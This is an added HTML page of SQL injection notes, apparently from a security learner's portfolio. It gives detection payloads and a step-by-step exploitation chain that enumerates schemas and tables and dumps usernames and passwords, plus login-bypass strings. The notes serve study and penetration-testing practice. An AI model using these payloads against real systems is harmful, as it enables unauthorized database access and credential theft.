@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>SQL Injection Notes</title>
+  <link rel="stylesheet" href="notes.css">
+</head>
+
+<body>
+
+<section>
+  <div class="card">
+
+<h4># SQL Injection Basics</h4>
+
+<p>
+SQL Injection is a web vulnerability where an attacker can manipulate database queries by injecting malicious SQL code into input fields.
+</p>
+
+<hr>
+
+<h4># How to Identify SQL Injection</h4>
+
+<h4>1. Error-Based SQL Injection</h4>
+
+<div class="code-box">
+<pre>
+' = %27
+" = %22
+# = %23
+; = %3B
+) = %29
+</pre>
+</div>
+
+<p>If SQL or PHP error appears in response, it indicates error-based SQL injection.</p>
+
+<h4>2. UNION-Based SQL Injection</h4>
+
+<div class="code-box">
+<pre>
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+</pre>
+</div>
+
+<p>When error appears, previous number is column count.</p>
+
+<div class="code-box">
+<pre>
+' UNION SELECT NULL,NULL--
+</pre>
+</div>
+
+<p>If response changes, UNION injection possible.</p>
+
+<h4>3. Boolean-Based Blind SQL Injection</h4>
+
+<div class="code-box">
+<pre>
+' AND 1=1--
+' AND 1=2--
+</pre>
+</div>
+
+<p>If response differs, Boolean-based SQLi exists.</p>
+
+<h4>4. Time-Based Blind SQL Injection</h4>
+
+<div class="code-box">
+<pre>
+' AND SLEEP(10)--
+</pre>
+</div>
+
+<p>If response delays, Time-based SQLi possible.</p>
+
+<hr>
+
+<h4># How to Exploit SQL Injection</h4>
+
+<h4>Step 1: Find Column Count</h4>
+
+<div class="code-box">
+<pre>
+order by 2-- -
+</pre>
+</div>
+
+<h4>Step 2: Find Database Version</h4>
+
+<div class="code-box">
+<pre>
+' UNION SELECT NULL, @@VERSION--
+' UNION SELECT NULL, VERSION()--
+' UNION SELECT NULL, BANNER FROM V$VERSION--
+</pre>
+</div>
+
+<h4>Step 3: Schema Enumeration</h4>
+
+<div class="code-box">
+<pre>
+' UNION SELECT 1,schema_name,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
+</pre>
+</div>
+
+<h4>Step 4: Table Enumeration</h4>
+
+<div class="code-box">
+<pre>
+' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 
+FROM INFORMATION_SCHEMA.TABLES 
+WHERE table_schema='dev'-- -
+</pre>
+</div>
+
+<h4>Step 5: Column Enumeration</h4>
+
+<div class="code-box">
+<pre>
+' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA 
+FROM INFORMATION_SCHEMA.COLUMNS 
+WHERE table_name='credentials'-- -
+</pre>
+</div>
+
+<h4>Step 6: Data Dump</h4>
+
+<div class="code-box">
+<pre>
+' UNION SELECT 1, username, password, 4 
+FROM dev.credentials-- -
+</pre>
+</div>
+
+<hr>
+
+<h4># Boolean-Based SQL Injection Steps</h4>
+
+<div class="code-box">
+<pre>
+admin123' UNION SELECT 1--
+admin123' UNION SELECT 1,2,3--
+</pre>
+</div>
+
+<div class="code-box">
+<pre>
+admin123' UNION SELECT 1,2,3 
+WHERE database() LIKE 's%';
+</pre>
+</div>
+
+<hr>
+
+<h4># Time-Based SQL Injection</h4>
+
+<div class="code-box">
+<pre>
+admin123' UNION SELECT SLEEP(5),2,3--
+</pre>
+</div>
+
+<hr>
+
+<h4># Authentication Bypass (Login Bypass)</h4>
+
+<div class="code-box">
+<pre>
+' OR '1'='1
+' OR 1=1--
+' OR '1'='1'--
+</pre>
+</div>
+
+<hr>
+
+<h4># Useful Payload Repository</h4>
+
+<p>
+<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" target="_blank">
+PayloadsAllTheThings - SQL Injection
+</a>
+</p>
+
+<hr>
+
+<h4># Related Topics</h4>
+
+<ul>
+  <li>XXE Injection</li>
+  <li>XSS (Cross Site Scripting)</li>
+  <li>SSRF (Server Side Request Forgery)</li>
+</ul>
+
+<br>
+
+<a href="index.html">⬅ Back to Portfolio</a>
+
+  </div>
+</section>
+
+</body>
+</html>
